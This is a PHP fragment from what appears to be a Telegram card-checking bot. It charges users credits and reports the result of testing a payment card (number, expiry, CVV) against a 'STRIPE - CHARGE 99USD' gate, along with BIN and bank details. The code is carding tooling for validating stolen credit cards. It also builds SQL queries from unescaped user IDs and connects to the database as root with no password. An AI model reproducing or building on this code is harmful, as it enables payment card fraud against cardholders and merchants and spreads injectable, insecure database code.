$link = mysqli_connect("localhost", "root", "", "demo");
    $sql = "SELECT credits FROM persons WHERE userid='$gId'";
    $result = mysqli_query($link, $sql);
    $json_array = [];
    while ($row = mysqli_fetch_assoc($result)) {
      $json_array[] = $row;
    }
    $final2 = json_encode($json_array);
    $client = trim(strip_tags(getStr($final2, '"credits":"','"')));
mysqli_close($link);
    $balance = $client - 5;

$link = mysqli_connect("localhost", "root", "", "demo");
    $sql = "UPDATE persons SET credits = '$balance' WHERE persons.userid='$gId'";
    $result = mysqli_query($link, $sql);
mysqli_close($link);
$result = urlencode("<b>
GATE --><i> STRIPE - CHARGE 99USD</i>
CC ->> <code>$cc|$mes|$ano|$cvv|@RoldexVerse</code>
Result ->> $status
Message ->> $cc_code
Bin Info ->> $bincap4-$bincap3-$bincap5
Bank Info ->> $roldex-$bincap2-{$flag($bincap2)}
Time ->> {$mytime($starttime)}s
Checked By ->> <a href='tg://user?id=$gId'>@${username}</a>[<i>$role</i>]
Credit Left ->> ${balance}💰
Bot By --> <code>@r0ld3x</code></b>");
edit_message($chatId,$message_id_1,$keyboard, $result);
    rest($list);
    $timest = time();

$link = mysqli_connect("localhost", "root", "", "demo");
    $sql = "UPDATE persons SET time = '$timest' WHERE persons.userid='$gId'";
    $result21 = mysqli_query($link, $sql);
mysqli_close($link);
}
?>